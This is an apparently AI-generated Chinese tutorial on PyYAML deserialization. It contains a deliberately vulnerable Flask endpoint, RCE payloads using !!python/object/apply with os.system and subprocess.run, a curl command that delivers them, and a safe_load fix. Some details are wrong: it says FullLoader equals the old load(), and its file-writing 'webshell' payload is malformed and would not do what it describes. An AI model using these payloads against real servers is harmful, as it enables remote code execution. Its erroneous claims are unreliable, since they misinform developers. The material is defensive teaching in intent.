---
title: Gemini2.5生成的漏洞介绍页
footer: AI生成，随便抄
category:
  - 草稿
  - AI+
---
[[toc]]

---

### 1. PyYAML反序列化漏洞的根本原因

要理解漏洞，首先要明白什么是序列化和反序列化。

*   **序列化 (Serialization)**: 将内存中的Python对象（如字典、列表、自定义类的实例）转换成一种可存储或可传输的格式（如字符串、字节流）。
*   **反序列化 (Deserialization)**: 将序列化后的字符串或字节流，恢复成原来的Python对象。

YAML作为一种数据格式，比JSON功能更强大。它不仅能表示基本的数据类型（字符串、数字、列表、字典），**还能表示复杂的数据类型，比如一个类的实例**。

**漏洞的根本原因在于PyYAML的`load()`函数的设计过于强大和灵活。**

为了能够将YAML数据完美地恢复（反序列化）成一个Python对象，`yaml.load()`需要能够：
1.  找到这个对象所属的类。
2.  调用这个类的构造函数 (`__init__`) 或其他方法来创建实例。

这实际上意味着`yaml.load()`函数**具备了动态执行代码的能力**。攻击者可以精心构造一个恶意的YAML字符串，让`load()`函数在解析时，去调用任意他想执行的系统命令（如`os.system`）或函数。

为了解决这个问题，PyYAML的维护者引入了`yaml.safe_load()`。

*   `yaml.load()`: 完整功能的加载器，**不安全**。它可以解析任意YAML标签，并构造任意Python对象，因此可以执行代码。
*   `yaml.safe_load()`: 安全加载器，**安全**。它被限制只能解析标准的YAML标签（如字符串、列表、字典等），禁用了所有危险的、可导致代码执行的标签。

**核心结论：漏洞的根源在于开发者错误地使用了`yaml.load(unsafe_yaml_string)`，而不是`yaml.safe_load(unsafe_yaml_string)`来处理来自不可信来源的YAML数据。**

---

### 2. 利用方式（Payload示例）

攻击者通过在YAML文件中使用特定的标签（Tags）来指定要执行的动作。最核心的标签是 `!!python/object/apply:`。

它的作用是：告诉PyYAML去加载一个指定的Python模块，并调用其中的某个函数。

下面是几个经典的攻击载荷（Payload）示例。

#### 场景假设

假设有一个存在漏洞的Web应用，其代码如下：

```python
# vulnerable_app.py
import yaml
from flask import Flask, request

app = Flask(__name__)

@app.route('/api/process', methods=['POST'])
def process_data():
    try:
        # 从POST请求中获取原始数据
        raw_data = request.get_data()
        
        # 错误地使用了 yaml.load()
        data = yaml.load(raw_data, Loader=yaml.FullLoader) # FullLoader等同于旧版的load
        
        # ... 正常的业务逻辑 ...
        return f"Data processed successfully: {data.get('name', 'N/A')}"

    except Exception as e:
        return f"An error occurred: {e}", 500

if __name__ == '__main__':
    app.run(debug=True)

```

#### 利用方式1：执行系统命令 (RCE - Remote Code Execution)

这是最直接、最危险的利用方式。攻击者可以执行任意服务器命令。

**恶意YAML (`payload_rce.yml`):**

```yaml
!!python/object/apply:os.system
- "whoami"  # 在Linux/macOS上查看当前用户
# - "calc"  # 在Windows上弹出计算器
```

**如何利用:**

攻击者向 `/api/process` 发送一个POST请求，请求体就是上面YAML的内容。

```bash
curl -X POST http://127.0.0.1:5000/api/process --data-binary @payload_rce.yml
```

当`yaml.load()`解析这个YAML时：
1.  看到 `!!python/object/apply:os.system`，它会 `import os` 并找到 `system` 函数。
2.  看到 `- "whoami"`，它会将这个字符串作为参数传递给 `os.system` 函数。
3.  最终执行了 `os.system('whoami')`。服务器的终端会打印出运行应用的用户（如 `www-data`），攻击者虽然直接看不到回显，但可以通过其他方式（如反向shell）来获取结果。

#### 利用方式2：创建文件（例如写入WebShell）

攻击者可以在服务器上写入任意文件，比如一个后门脚本。

**恶意YAML (`payload_webshell.yml`):**

```yaml
!!python/object/apply:builtins.open
- "/tmp/shell.txt"  # 要写入的文件路径
- "w"               # 文件模式为写入
- !!python/object/apply:__builtin__.getattr
  - !!python/object/apply:__builtin__.str
    - "Hello, you have been hacked!" # 文件内容
  - "write"
```

这个Payload稍微复杂一点，它模拟了 `open('/tmp/shell.txt', 'w').write('Hello...')` 的过程。当服务器解析这个YAML时，会在`/tmp`目录下创建一个名为`shell.txt`的文件。

#### 利用方式3：利用`subprocess`模块（更灵活的RCE）

`subprocess`模块比`os.system`更强大，是现代Python推荐的执行命令的方式。

**恶意YAML (`payload_subprocess.yml`):**

```yaml
!!python/object/apply:subprocess.run
- ["ls", "-l", "/"] # 将命令和参数作为列表传递
```

这将执行 `subprocess.run(["ls", "-l", "/"])`，列出服务器的根目录文件。

---

### 3. 可能出现漏洞的（外部导入）情景

“外部导入”指的是应用加载和解析了**非开发者完全控制**的YAML数据。只要数据来源有一丝不确定性，就必须视为不安全。

以下是几种非常常见的漏洞场景：

1.  **处理用户上传的配置文件**
    *   **场景描述：** 一个多租户平台允许用户上传一个`.yml`文件来配置他们自己的应用或服务（例如，自定义主题、CI/CD流水线步骤、报表模板）。
    *   **风险：** 用户可以上传一个包含恶意Payload的YAML文件。当后台服务加载此文件以应用配置时，就会触发代码执行。

2.  **Web API接口接收YAML格式数据**
    *   **场景描述：** 一个RESTful API为了灵活性，允许客户端通过`Content-Type: application/yaml`头来提交YAML格式的数据，而不是JSON。
    *   **风险：** 这是最直接的攻击面。攻击者可以直接将恶意YAML作为请求体发送到服务器，如上面`curl`示例所示。

3.  **数据导入/导出功能**
    *   **场景描述：** 一个应用支持“数据备份”和“数据恢复”功能，并将数据导出为YAML格式。用户可以下载备份文件，并在需要时上传恢复。
    *   **风险：** 攻击者可以手动编辑导出的YAML备份文件，植入恶意Payload，然后将其上传。当应用解析这个被篡改过的文件进行数据恢复时，漏洞被触发。这也可能用于攻击其他用户（例如，诱使管理员导入一个“有问题”的备份文件）。

4.  **读取程序的配置或元数据文件**
    *   **场景描述：** 一个程序从一个`config.yml`文件中读取设置。通常情况下这个文件只有管理员能修改。但如果这个文件位于一个Web目录下，或者由于错误的权限配置，导致低权限用户（如`www-data`）可以修改它，就会产生风险。
    *   **风险：** 攻击者通过其他漏洞（如任意文件写入）修改了`config.yml`文件，植入恶意YAML。当管理员重启服务或服务自动重载配置时，就会执行恶意代码，可能导致权限提升。

5.  **机器学习模型文件**
    *   **场景描述：** 一些机器学习框架（尤其是一些较旧的或学术性的）可能使用YAML来定义模型结构、权重等。如果一个应用允许用户加载他人分享的、从网络上下载的预训练模型文件，就存在风险。
    *   **风险：** 攻击者可以发布一个看似正常的模型文件，但其中嵌入了恶意的YAML Payload。当研究员或应用加载此模型时，就会在自己的机器上执行恶意代码。

### 防御措施总结

**黄金法则：** 在任何时候处理来自外部（用户、网络、文件系统等）的YAML数据时，**永远、永远、永远使用 `yaml.safe_load()`**。

**代码修复示例：**

```python
# 安全的代码
import yaml

# ...

# 使用 safe_load()，即使raw_data包含恶意payload，也只会抛出异常或解析为普通数据，绝不会执行代码
data = yaml.safe_load(raw_data) 
```